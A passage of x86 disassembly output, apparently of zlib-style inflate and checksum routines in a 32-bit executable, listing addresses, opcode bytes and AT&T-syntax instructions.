  407a97:	c7 40 18 b2 d5 40 00 	movl   $0x40d5b2,0x18(%eax)
  407a9e:	8b 44 24 24          	mov    0x24(%esp),%eax
  407aa2:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  407aa8:	b8 1d 00 00 00       	mov    $0x1d,%eax
  407aad:	e9 a7 e2 ff ff       	jmp    0x405d59
  407ab2:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  407ab9:	8b 6c 24 44          	mov    0x44(%esp),%ebp
  407abd:	c7 40 18 61 d6 40 00 	movl   $0x40d661,0x18(%eax)
  407ac4:	8b 44 24 24          	mov    0x24(%esp),%eax
  407ac8:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  407ace:	b8 1d 00 00 00       	mov    $0x1d,%eax
  407ad3:	e9 81 e2 ff ff       	jmp    0x405d59
  407ad8:	89 eb                	mov    %ebp,%ebx
  407ada:	31 f6                	xor    %esi,%esi
  407adc:	89 fd                	mov    %edi,%ebp
  407ade:	c7 44 24 3c 00 00 00 	movl   $0x0,0x3c(%esp)
  407ae5:	00 
  407ae6:	8b 7c 24 24          	mov    0x24(%esp),%edi
  407aea:	e9 b1 e8 ff ff       	jmp    0x4063a0
  407aef:	89 f0                	mov    %esi,%eax
  407af1:	89 de                	mov    %ebx,%esi
  407af3:	89 eb                	mov    %ebp,%ebx
  407af5:	c1 e8 03             	shr    $0x3,%eax
  407af8:	89 fd                	mov    %edi,%ebp
  407afa:	83 ee 03             	sub    $0x3,%esi
  407afd:	8b 7c 24 24          	mov    0x24(%esp),%edi
  407b01:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  407b05:	e9 96 e8 ff ff       	jmp    0x4063a0
  407b0a:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  407b0e:	8b 41 6c             	mov    0x6c(%ecx),%eax
  407b11:	c7 41 58 06 00 00 00 	movl   $0x6,0x58(%ecx)
  407b18:	89 41 50             	mov    %eax,0x50(%ecx)
  407b1b:	89 c8                	mov    %ecx,%eax
  407b1d:	8b 4c 24 4c          	mov    0x4c(%esp),%ecx
  407b21:	89 54 24 0c          	mov    %edx,0xc(%esp)
  407b25:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  407b29:	89 c1                	mov    %eax,%ecx
  407b2b:	83 c0 58             	add    $0x58,%eax
  407b2e:	89 44 24 10          	mov    %eax,0x10(%esp)
  407b32:	8b 41 64             	mov    0x64(%ecx),%eax
  407b35:	89 44 24 08          	mov    %eax,0x8(%esp)
  407b39:	8b 41 60             	mov    0x60(%ecx),%eax
  407b3c:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
  407b43:	8d 44 41 70          	lea    0x70(%ecx,%eax,2),%eax
  407b47:	89 44 24 04          	mov    %eax,0x4(%esp)
  407b4b:	e8 d0 0e 00 00       	call   0x408a20
  407b50:	85 c0                	test   %eax,%eax
  407b52:	89 44 24 38          	mov    %eax,0x38(%esp)
  407b56:	0f 84 48 e4 ff ff    	je     0x405fa4
  407b5c:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  407b63:	c7 40 18 bd d6 40 00 	movl   $0x40d6bd,0x18(%eax)
  407b6a:	8b 44 24 24          	mov    0x24(%esp),%eax
  407b6e:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  407b74:	b8 1d 00 00 00       	mov    $0x1d,%eax
  407b79:	e9 db e1 ff ff       	jmp    0x405d59
  407b7e:	66 90                	xchg   %ax,%ax
  407b80:	53                   	push   %ebx
  407b81:	83 ec 18             	sub    $0x18,%esp
  407b84:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  407b88:	85 db                	test   %ebx,%ebx
  407b8a:	74 44                	je     0x407bd0
  407b8c:	8b 43 1c             	mov    0x1c(%ebx),%eax
  407b8f:	85 c0                	test   %eax,%eax
  407b91:	74 3d                	je     0x407bd0
  407b93:	8b 53 24             	mov    0x24(%ebx),%edx
  407b96:	85 d2                	test   %edx,%edx
  407b98:	74 36                	je     0x407bd0
  407b9a:	8b 48 34             	mov    0x34(%eax),%ecx
  407b9d:	85 c9                	test   %ecx,%ecx
  407b9f:	74 12                	je     0x407bb3
  407ba1:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  407ba5:	8b 43 28             	mov    0x28(%ebx),%eax
  407ba8:	89 04 24             	mov    %eax,(%esp)
  407bab:	ff d2                	call   *%edx
  407bad:	8b 53 24             	mov    0x24(%ebx),%edx
  407bb0:	8b 43 1c             	mov    0x1c(%ebx),%eax
  407bb3:	89 44 24 04          	mov    %eax,0x4(%esp)
  407bb7:	8b 43 28             	mov    0x28(%ebx),%eax
  407bba:	89 04 24             	mov    %eax,(%esp)
  407bbd:	ff d2                	call   *%edx
  407bbf:	c7 43 1c 00 00 00 00 	movl   $0x0,0x1c(%ebx)
  407bc6:	31 c0                	xor    %eax,%eax
  407bc8:	83 c4 18             	add    $0x18,%esp
  407bcb:	5b                   	pop    %ebx
  407bcc:	c3                   	ret
  407bcd:	8d 76 00             	lea    0x0(%esi),%esi
  407bd0:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  407bd5:	eb f1                	jmp    0x407bc8
  407bd7:	89 f6                	mov    %esi,%esi
  407bd9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  407be0:	57                   	push   %edi
  407be1:	56                   	push   %esi
  407be2:	53                   	push   %ebx
  407be3:	83 ec 10             	sub    $0x10,%esp
  407be6:	8b 44 24 20          	mov    0x20(%esp),%eax
  407bea:	8b 74 24 24          	mov    0x24(%esp),%esi
  407bee:	8b 7c 24 28          	mov    0x28(%esp),%edi
  407bf2:	85 c0                	test   %eax,%eax
  407bf4:	74 5e                	je     0x407c54
  407bf6:	8b 58 1c             	mov    0x1c(%eax),%ebx
  407bf9:	85 db                	test   %ebx,%ebx
  407bfb:	74 57                	je     0x407c54
  407bfd:	85 f6                	test   %esi,%esi
  407bff:	8b 43 2c             	mov    0x2c(%ebx),%eax
  407c02:	74 37                	je     0x407c3b
  407c04:	85 c0                	test   %eax,%eax
  407c06:	74 33                	je     0x407c3b
  407c08:	8b 53 30             	mov    0x30(%ebx),%edx
  407c0b:	29 d0                	sub    %edx,%eax
  407c0d:	03 53 34             	add    0x34(%ebx),%edx
  407c10:	89 34 24             	mov    %esi,(%esp)
  407c13:	89 44 24 08          	mov    %eax,0x8(%esp)
  407c17:	89 54 24 04          	mov    %edx,0x4(%esp)
  407c1b:	e8 38 2c 00 00       	call   0x40a858
  407c20:	8b 43 30             	mov    0x30(%ebx),%eax
  407c23:	8b 53 34             	mov    0x34(%ebx),%edx
  407c26:	29 c6                	sub    %eax,%esi
  407c28:	03 73 2c             	add    0x2c(%ebx),%esi
  407c2b:	89 44 24 08          	mov    %eax,0x8(%esp)
  407c2f:	89 54 24 04          	mov    %edx,0x4(%esp)
  407c33:	89 34 24             	mov    %esi,(%esp)
  407c36:	e8 1d 2c 00 00       	call   0x40a858
  407c3b:	85 ff                	test   %edi,%edi
  407c3d:	74 11                	je     0x407c50
  407c3f:	8b 43 2c             	mov    0x2c(%ebx),%eax
  407c42:	89 07                	mov    %eax,(%edi)
  407c44:	31 c0                	xor    %eax,%eax
  407c46:	83 c4 10             	add    $0x10,%esp
  407c49:	5b                   	pop    %ebx
  407c4a:	5e                   	pop    %esi
  407c4b:	5f                   	pop    %edi
  407c4c:	c3                   	ret
  407c4d:	8d 76 00             	lea    0x0(%esi),%esi
  407c50:	31 c0                	xor    %eax,%eax
  407c52:	eb f2                	jmp    0x407c46
  407c54:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  407c59:	eb eb                	jmp    0x407c46
  407c5b:	90                   	nop
  407c5c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  407c60:	57                   	push   %edi
  407c61:	56                   	push   %esi
  407c62:	53                   	push   %ebx
  407c63:	83 ec 10             	sub    $0x10,%esp
  407c66:	8b 74 24 20          	mov    0x20(%esp),%esi
  407c6a:	8b 7c 24 28          	mov    0x28(%esp),%edi
  407c6e:	85 f6                	test   %esi,%esi
  407c70:	74 7f                	je     0x407cf1
  407c72:	8b 5e 1c             	mov    0x1c(%esi),%ebx
  407c75:	85 db                	test   %ebx,%ebx
  407c77:	74 78                	je     0x407cf1
  407c79:	8b 43 08             	mov    0x8(%ebx),%eax
  407c7c:	85 c0                	test   %eax,%eax
  407c7e:	75 30                	jne    0x407cb0
  407c80:	83 3b 0a             	cmpl   $0xa,(%ebx)
  407c83:	74 30                	je     0x407cb5
  407c85:	8b 54 24 24          	mov    0x24(%esp),%edx
  407c89:	89 f9                	mov    %edi,%ecx
  407c8b:	89 f0                	mov    %esi,%eax
  407c8d:	01 fa                	add    %edi,%edx
  407c8f:	e8 bc db ff ff       	call   0x405850
  407c94:	85 c0                	test   %eax,%eax
  407c96:	75 68                	jne    0x407d00
  407c98:	c7 43 0c 01 00 00 00 	movl   $0x1,0xc(%ebx)
  407c9f:	31 c0                	xor    %eax,%eax
  407ca1:	83 c4 10             	add    $0x10,%esp
  407ca4:	5b                   	pop    %ebx
  407ca5:	5e                   	pop    %esi
  407ca6:	5f                   	pop    %edi
  407ca7:	c3                   	ret
  407ca8:	90                   	nop
  407ca9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  407cb0:	83 3b 0a             	cmpl   $0xa,(%ebx)
  407cb3:	75 3c                	jne    0x407cf1
  407cb5:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  407cbc:	00 
  407cbd:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  407cc4:	00 
  407cc5:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  407ccc:	e8 ef 04 00 00       	call   0x4081c0
  407cd1:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  407cd5:	89 7c 24 08          	mov    %edi,0x8(%esp)
  407cd9:	89 04 24             	mov    %eax,(%esp)
  407cdc:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  407ce0:	e8 db 04 00 00       	call   0x4081c0
  407ce5:	39 43 18             	cmp    %eax,0x18(%ebx)
  407ce8:	74 9b                	je     0x407c85
  407cea:	b8 fd ff ff ff       	mov    $0xfffffffd,%eax
  407cef:	eb b0                	jmp    0x407ca1
  407cf1:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  407cf6:	eb a9                	jmp    0x407ca1
  407cf8:	90                   	nop
  407cf9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  407d00:	c7 03 1e 00 00 00    	movl   $0x1e,(%ebx)
  407d06:	b8 fc ff ff ff       	mov    $0xfffffffc,%eax
  407d0b:	eb 94                	jmp    0x407ca1
  407d0d:	8d 76 00             	lea    0x0(%esi),%esi
  407d10:	8b 44 24 04          	mov    0x4(%esp),%eax
  407d14:	8b 54 24 08          	mov    0x8(%esp),%edx
  407d18:	85 c0                	test   %eax,%eax
  407d1a:	74 24                	je     0x407d40
  407d1c:	8b 40 1c             	mov    0x1c(%eax),%eax
  407d1f:	85 c0                	test   %eax,%eax
  407d21:	74 1d                	je     0x407d40
  407d23:	f6 40 08 02          	testb  $0x2,0x8(%eax)
  407d27:	74 17                	je     0x407d40
  407d29:	89 50 20             	mov    %edx,0x20(%eax)
  407d2c:	c7 42 30 00 00 00 00 	movl   $0x0,0x30(%edx)
  407d33:	31 c0                	xor    %eax,%eax
  407d35:	c3                   	ret
  407d36:	8d 76 00             	lea    0x0(%esi),%esi
  407d39:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  407d40:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  407d45:	c3                   	ret
  407d46:	8d 76 00             	lea    0x0(%esi),%esi
  407d49:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  407d50:	55                   	push   %ebp
  407d51:	57                   	push   %edi
  407d52:	56                   	push   %esi
  407d53:	53                   	push   %ebx
  407d54:	83 ec 14             	sub    $0x14,%esp
  407d57:	8b 5c 24 28          	mov    0x28(%esp),%ebx
  407d5b:	85 db                	test   %ebx,%ebx
  407d5d:	0f 84 e8 00 00 00    	je     0x407e4b
  407d63:	8b 7b 1c             	mov    0x1c(%ebx),%edi
  407d66:	85 ff                	test   %edi,%edi
  407d68:	0f 84 dd 00 00 00    	je     0x407e4b
  407d6e:	8b 4b 04             	mov    0x4(%ebx),%ecx
  407d71:	85 c9                	test   %ecx,%ecx
  407d73:	0f 84 a8 00 00 00    	je     0x407e21
  407d79:	83 3f 1f             	cmpl   $0x1f,(%edi)
  407d7c:	8d 77 68             	lea    0x68(%edi),%esi
  407d7f:	74 63                	je     0x407de4
  407d81:	8b 57 3c             	mov    0x3c(%edi),%edx
  407d84:	8b 47 38             	mov    0x38(%edi),%eax
  407d87:	c7 07 1f 00 00 00    	movl   $0x1f,(%edi)
  407d8d:	89 d1                	mov    %edx,%ecx
  407d8f:	83 e2 f8             	and    $0xfffffff8,%edx
  407d92:	83 e1 07             	and    $0x7,%ecx
  407d95:	89 57 3c             	mov    %edx,0x3c(%edi)
  407d98:	d3 e0                	shl    %cl,%eax
  407d9a:	83 fa 07             	cmp    $0x7,%edx
  407d9d:	89 d1                	mov    %edx,%ecx
  407d9f:	89 47 38             	mov    %eax,0x38(%edi)
  407da2:	0f 86 98 00 00 00    	jbe    0x407e40
  407da8:	83 e9 08             	sub    $0x8,%ecx
  407dab:	8d 54 24 10          	lea    0x10(%esp),%edx
  407daf:	c1 e9 03             	shr    $0x3,%ecx
  407db2:	83 c1 01             	add    $0x1,%ecx
  407db5:	89 d6                	mov    %edx,%esi
  407db7:	8d 2c 0a             	lea    (%edx,%ecx,1),%ebp
  407dba:	88 06                	mov    %al,(%esi)
  407dbc:	83 c6 01             	add    $0x1,%esi
  407dbf:	c1 e8 08             	shr    $0x8,%eax
  407dc2:	39 ee                	cmp    %ebp,%esi
  407dc4:	75 f4                	jne    0x407dba
  407dc6:	89 47 38             	mov    %eax,0x38(%edi)
  407dc9:	c7 47 3c 00 00 00 00 	movl   $0x0,0x3c(%edi)
  407dd0:	8d 77 68             	lea    0x68(%edi),%esi
  407dd3:	c7 47 68 00 00 00 00 	movl   $0x0,0x68(%edi)
  407dda:	89 f0                	mov    %esi,%eax
  407ddc:	e8 df d9 ff ff       	call   0x4057c0
  407de1:	8b 4b 04             	mov    0x4(%ebx),%ecx
  407de4:	8b 13                	mov    (%ebx),%edx
  407de6:	89 f0                	mov    %esi,%eax
  407de8:	e8 d3 d9 ff ff       	call   0x4057c0
  407ded:	29 43 04             	sub    %eax,0x4(%ebx)
  407df0:	01 03                	add    %eax,(%ebx)
  407df2:	03 43 08             	add    0x8(%ebx),%eax
  407df5:	83 7f 68 04          	cmpl   $0x4,0x68(%edi)
  407df9:	89 c6                	mov    %eax,%esi
  407dfb:	89 43 08             	mov    %eax,0x8(%ebx)
  407dfe:	75 32                	jne    0x407e32
  407e00:	8b 6b 14             	mov    0x14(%ebx),%ebp
  407e03:	89 1c 24             	mov    %ebx,(%esp)
  407e06:	e8 25 dc ff ff       	call   0x405a30
  407e0b:	89 73 08             	mov    %esi,0x8(%ebx)
  407e0e:	31 c0                	xor    %eax,%eax
  407e10:	89 6b 14             	mov    %ebp,0x14(%ebx)
  407e13:	c7 07 0b 00 00 00    	movl   $0xb,(%edi)
  407e19:	83 c4 14             	add    $0x14,%esp
  407e1c:	5b                   	pop    %ebx
  407e1d:	5e                   	pop    %esi
  407e1e:	5f                   	pop    %edi
  407e1f:	5d                   	pop    %ebp
  407e20:	c3                   	ret
  407e21:	83 7f 3c 07          	cmpl   $0x7,0x3c(%edi)
  407e25:	0f 87 4e ff ff ff    	ja     0x407d79
  407e2b:	b8 fb ff ff ff       	mov    $0xfffffffb,%eax
  407e30:	eb e7                	jmp    0x407e19
  407e32:	83 c4 14             	add    $0x14,%esp
  407e35:	b8 fd ff ff ff       	mov    $0xfffffffd,%eax
  407e3a:	5b                   	pop    %ebx
  407e3b:	5e                   	pop    %esi
  407e3c:	5f                   	pop    %edi
  407e3d:	5d                   	pop    %ebp
  407e3e:	c3                   	ret
  407e3f:	90                   	nop
  407e40:	31 c9                	xor    %ecx,%ecx
  407e42:	8d 54 24 10          	lea    0x10(%esp),%edx
  407e46:	e9 85 ff ff ff       	jmp    0x407dd0
  407e4b:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  407e50:	eb c7                	jmp    0x407e19
  407e52:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  407e59:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  407e60:	8b 44 24 04          	mov    0x4(%esp),%eax
  407e64:	85 c0                	test   %eax,%eax
  407e66:	74 28                	je     0x407e90
  407e68:	8b 50 1c             	mov    0x1c(%eax),%edx
  407e6b:	85 d2                	test   %edx,%edx
  407e6d:	74 21                	je     0x407e90
  407e6f:	31 c0                	xor    %eax,%eax
  407e71:	83 3a 0d             	cmpl   $0xd,(%edx)
  407e74:	74 0a                	je     0x407e80
  407e76:	f3 c3                	repz ret
  407e78:	90                   	nop
  407e79:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  407e80:	8b 52 3c             	mov    0x3c(%edx),%edx
  407e83:	31 c0                	xor    %eax,%eax
  407e85:	85 d2                	test   %edx,%edx
  407e87:	0f 94 c0             	sete   %al
  407e8a:	c3                   	ret
  407e8b:	90                   	nop
  407e8c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  407e90:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  407e95:	c3                   	ret
  407e96:	8d 76 00             	lea    0x0(%esi),%esi
  407e99:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  407ea0:	55                   	push   %ebp
  407ea1:	57                   	push   %edi
  407ea2:	56                   	push   %esi
  407ea3:	53                   	push   %ebx
  407ea4:	83 ec 2c             	sub    $0x2c,%esp
  407ea7:	8b 5c 24 40          	mov    0x40(%esp),%ebx
  407eab:	8b 74 24 44          	mov    0x44(%esp),%esi
  407eaf:	85 db                	test   %ebx,%ebx
  407eb1:	0f 84 a9 01 00 00    	je     0x408060
  407eb7:	85 f6                	test   %esi,%esi
  407eb9:	0f 84 a1 01 00 00    	je     0x408060
  407ebf:	8b 6e 1c             	mov    0x1c(%esi),%ebp
  407ec2:	85 ed                	test   %ebp,%ebp
  407ec4:	0f 84 96 01 00 00    	je     0x408060
  407eca:	8b 46 20             	mov    0x20(%esi),%eax
  407ecd:	85 c0                	test   %eax,%eax
  407ecf:	0f 84 8b 01 00 00    	je     0x408060
  407ed5:	8b 56 24             	mov    0x24(%esi),%edx
  407ed8:	85 d2                	test   %edx,%edx
  407eda:	0f 84 80 01 00 00    	je     0x408060
  407ee0:	c7 44 24 08 cc 1b 00 	movl   $0x1bcc,0x8(%esp)
  407ee7:	00 
  407ee8:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  407eef:	00 
  407ef0:	8b 56 28             	mov    0x28(%esi),%edx
  407ef3:	89 14 24             	mov    %edx,(%esp)
  407ef6:	ff d0                	call   *%eax
  407ef8:	85 c0                	test   %eax,%eax
  407efa:	89 c2                	mov    %eax,%edx
  407efc:	0f 84 65 01 00 00    	je     0x408067
  407f02:	8b 45 34             	mov    0x34(%ebp),%eax
  407f05:	85 c0                	test   %eax,%eax
  407f07:	0f 84 43 01 00 00    	je     0x408050
  407f0d:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  407f14:	00 
  407f15:	8b 4d 24             	mov    0x24(%ebp),%ecx
  407f18:	b8 01 00 00 00       	mov    $0x1,%eax
  407f1d:	89 54 24 1c          	mov    %edx,0x1c(%esp)
  407f21:	d3 e0                	shl    %cl,%eax
  407f23:	89 44 24 04          	mov    %eax,0x4(%esp)
  407f27:	8b 46 28             	mov    0x28(%esi),%eax
  407f2a:	89 04 24             	mov    %eax,(%esp)
  407f2d:	ff 56 20             	call   *0x20(%esi)
  407f30:	85 c0                	test   %eax,%eax
  407f32:	89 44 24 18          	mov    %eax,0x18(%esp)
  407f36:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  407f3a:	0f 84 2e 01 00 00    	je     0x40806e
  407f40:	8b 06                	mov    (%esi),%eax
  407f42:	8d 7a 04             	lea    0x4(%edx),%edi
  407f45:	89 d1                	mov    %edx,%ecx
  407f47:	83 e7 fc             	and    $0xfffffffc,%edi
  407f4a:	89 03                	mov    %eax,(%ebx)
  407f4c:	8b 46 04             	mov    0x4(%esi),%eax
  407f4f:	29 f9                	sub    %edi,%ecx
  407f51:	89 43 04             	mov    %eax,0x4(%ebx)
  407f54:	8b 46 08             	mov    0x8(%esi),%eax
  407f57:	89 43 08             	mov    %eax,0x8(%ebx)
  407f5a:	8b 46 0c             	mov    0xc(%esi),%eax
  407f5d:	89 43 0c             	mov    %eax,0xc(%ebx)
  407f60:	8b 46 10             	mov    0x10(%esi),%eax
  407f63:	89 43 10             	mov    %eax,0x10(%ebx)
  407f66:	8b 46 14             	mov    0x14(%esi),%eax
  407f69:	89 43 14             	mov    %eax,0x14(%ebx)
  407f6c:	8b 46 18             	mov    0x18(%esi),%eax
  407f6f:	89 43 18             	mov    %eax,0x18(%ebx)
  407f72:	8b 46 1c             	mov    0x1c(%esi),%eax
  407f75:	89 43 1c             	mov    %eax,0x1c(%ebx)
  407f78:	8b 46 20             	mov    0x20(%esi),%eax
  407f7b:	89 43 20             	mov    %eax,0x20(%ebx)
  407f7e:	8b 46 24             	mov    0x24(%esi),%eax
  407f81:	89 43 24             	mov    %eax,0x24(%ebx)
  407f84:	8b 46 28             	mov    0x28(%esi),%eax
  407f87:	89 43 28             	mov    %eax,0x28(%ebx)
  407f8a:	8b 46 2c             	mov    0x2c(%esi),%eax
  407f8d:	89 43 2c             	mov    %eax,0x2c(%ebx)
  407f90:	8b 46 30             	mov    0x30(%esi),%eax
  407f93:	89 43 30             	mov    %eax,0x30(%ebx)
  407f96:	8b 46 34             	mov    0x34(%esi),%eax
  407f99:	89 ee                	mov    %ebp,%esi
  407f9b:	29 ce                	sub    %ecx,%esi
  407f9d:	81 c1 cc 1b 00 00    	add    $0x1bcc,%ecx
  407fa3:	c1 e9 02             	shr    $0x2,%ecx
  407fa6:	89 43 34             	mov    %eax,0x34(%ebx)
  407fa9:	8b 45 00             	mov    0x0(%ebp),%eax
  407fac:	89 02                	mov    %eax,(%edx)
  407fae:	8b 85 c8 1b 00 00    	mov    0x1bc8(%ebp),%eax
  407fb4:	89 82 c8 1b 00 00    	mov    %eax,0x1bc8(%edx)
  407fba:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  407fbc:	8b 45 4c             	mov    0x4c(%ebp),%eax
  407fbf:	8d 8d 30 05 00 00    	lea    0x530(%ebp),%ecx
  407fc5:	39 c8                	cmp    %ecx,%eax
  407fc7:	73 57                	jae    0x408020
  407fc9:	8b 45 6c             	mov    0x6c(%ebp),%eax
  407fcc:	8b 7c 24 18          	mov    0x18(%esp),%edi
  407fd0:	29 c8                	sub    %ecx,%eax
  407fd2:	c1 f8 02             	sar    $0x2,%eax
  407fd5:	85 ff                	test   %edi,%edi
  407fd7:	8d 84 82 30 05 00 00 	lea    0x530(%edx,%eax,4),%eax
  407fde:	89 42 6c             	mov    %eax,0x6c(%edx)
  407fe1:	74 25                	je     0x408008
  407fe3:	8b 4d 24             	mov    0x24(%ebp),%ecx
  407fe6:	b8 01 00 00 00       	mov    $0x1,%eax
  407feb:	89 54 24 1c          	mov    %edx,0x1c(%esp)
  407fef:	d3 e0                	shl    %cl,%eax
  407ff1:	8b 4d 34             	mov    0x34(%ebp),%ecx
  407ff4:	89 3c 24             	mov    %edi,(%esp)
  407ff7:	89 44 24 08          	mov    %eax,0x8(%esp)
  407ffb:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  407fff:	e8 54 28 00 00       	call   0x40a858
  408004:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  408008:	8b 44 24 18          	mov    0x18(%esp),%eax
  40800c:	89 42 34             	mov    %eax,0x34(%edx)
  40800f:	89 53 1c             	mov    %edx,0x1c(%ebx)
  408012:	31 c0                	xor    %eax,%eax
  408014:	83 c4 2c             	add    $0x2c,%esp
  408017:	5b                   	pop    %ebx
  408018:	5e                   	pop    %esi
  408019:	5f                   	pop    %edi
  40801a:	5d                   	pop    %ebp
  40801b:	c3                   	ret
  40801c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  408020:	8d b5 bc 1b 00 00    	lea    0x1bbc(%ebp),%esi
  408026:	39 f0                	cmp    %esi,%eax
  408028:	77 9f                	ja     0x407fc9
  40802a:	29 c8                	sub    %ecx,%eax
  40802c:	c1 f8 02             	sar    $0x2,%eax
  40802f:	8d 84 82 30 05 00 00 	lea    0x530(%edx,%eax,4),%eax
  408036:	89 42 4c             	mov    %eax,0x4c(%edx)
  408039:	8b 45 50             	mov    0x50(%ebp),%eax
  40803c:	29 c8                	sub    %ecx,%eax
  40803e:	c1 f8 02             	sar    $0x2,%eax
  408041:	8d 84 82 30 05 00 00 	lea    0x530(%edx,%eax,4),%eax
  408048:	89 42 50             	mov    %eax,0x50(%edx)
  40804b:	e9 79 ff ff ff       	jmp    0x407fc9
  408050:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  408057:	00 
  408058:	e9 e3 fe ff ff       	jmp    0x407f40
  40805d:	8d 76 00             	lea    0x0(%esi),%esi
  408060:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  408065:	eb ad                	jmp    0x408014
  408067:	b8 fc ff ff ff       	mov    $0xfffffffc,%eax
  40806c:	eb a6                	jmp    0x408014
  40806e:	89 54 24 04          	mov    %edx,0x4(%esp)
  408072:	8b 46 28             	mov    0x28(%esi),%eax
  408075:	89 04 24             	mov    %eax,(%esp)
  408078:	ff 56 24             	call   *0x24(%esi)
  40807b:	b8 fc ff ff ff       	mov    $0xfffffffc,%eax
  408080:	eb 92                	jmp    0x408014
  408082:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  408089:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  408090:	8b 44 24 04          	mov    0x4(%esp),%eax
  408094:	85 c0                	test   %eax,%eax
  408096:	74 18                	je     0x4080b0
  408098:	8b 40 1c             	mov    0x1c(%eax),%eax
  40809b:	85 c0                	test   %eax,%eax
  40809d:	74 11                	je     0x4080b0
  40809f:	c7 80 c0 1b 00 00 01 	movl   $0x1,0x1bc0(%eax)
  4080a6:	00 00 00 
  4080a9:	b8 fd ff ff ff       	mov    $0xfffffffd,%eax
  4080ae:	c3                   	ret
  4080af:	90                   	nop
  4080b0:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  4080b5:	c3                   	ret
  4080b6:	8d 76 00             	lea    0x0(%esi),%esi
  4080b9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4080c0:	53                   	push   %ebx
  4080c1:	8b 44 24 08          	mov    0x8(%esp),%eax
  4080c5:	85 c0                	test   %eax,%eax
  4080c7:	74 47                	je     0x408110
  4080c9:	8b 48 1c             	mov    0x1c(%eax),%ecx
  4080cc:	85 c9                	test   %ecx,%ecx
  4080ce:	74 40                	je     0x408110
  4080d0:	8b 91 c4 1b 00 00    	mov    0x1bc4(%ecx),%edx
  4080d6:	8b 19                	mov    (%ecx),%ebx
  4080d8:	c1 e2 10             	shl    $0x10,%edx
  4080db:	83 fb 0f             	cmp    $0xf,%ebx
  4080de:	74 10                	je     0x4080f0
  4080e0:	31 c0                	xor    %eax,%eax
  4080e2:	83 fb 18             	cmp    $0x18,%ebx
  4080e5:	74 19                	je     0x408100
  4080e7:	01 d0                	add    %edx,%eax
  4080e9:	5b                   	pop    %ebx
  4080ea:	c3                   	ret
  4080eb:	90                   	nop
  4080ec:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4080f0:	8b 41 40             	mov    0x40(%ecx),%eax
  4080f3:	01 d0                	add    %edx,%eax
  4080f5:	eb f2                	jmp    0x4080e9
  4080f7:	89 f6                	mov    %esi,%esi
  4080f9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  408100:	8b 81 c8 1b 00 00    	mov    0x1bc8(%ecx),%eax
  408106:	2b 41 40             	sub    0x40(%ecx),%eax
  408109:	01 d0                	add    %edx,%eax
  40810b:	eb dc                	jmp    0x4080e9
  40810d:	8d 76 00             	lea    0x0(%esi),%esi
  408110:	b8 00 00 ff ff       	mov    $0xffff0000,%eax
  408115:	5b                   	pop    %ebx
  408116:	c3                   	ret
  408117:	90                   	nop
  408118:	90                   	nop
  408119:	90                   	nop
  40811a:	90                   	nop
  40811b:	90                   	nop
  40811c:	90                   	nop
  40811d:	90                   	nop
  40811e:	90                   	nop
  40811f:	90                   	nop
  408120:	55                   	push   %ebp
  408121:	57                   	push   %edi
  408122:	89 c7                	mov    %eax,%edi
  408124:	56                   	push   %esi
  408125:	89 c8                	mov    %ecx,%eax
  408127:	be 71 80 07 80       	mov    $0x80078071,%esi
  40812c:	53                   	push   %ebx
  40812d:	89 d3                	mov    %edx,%ebx
  40812f:	0f b7 ef             	movzwl %di,%ebp
  408132:	f7 ee                	imul   %esi
  408134:	89 c8                	mov    %ecx,%eax
  408136:	c1 ef 10             	shr    $0x10,%edi
  408139:	c1 f8 1f             	sar    $0x1f,%eax
  40813c:	83 ec 04             	sub    $0x4,%esp
  40813f:	01 ca                	add    %ecx,%edx
  408141:	c1 fa 0f             	sar    $0xf,%edx
  408144:	29 c2                	sub    %eax,%edx
  408146:	0f b7 c3             	movzwl %bx,%eax
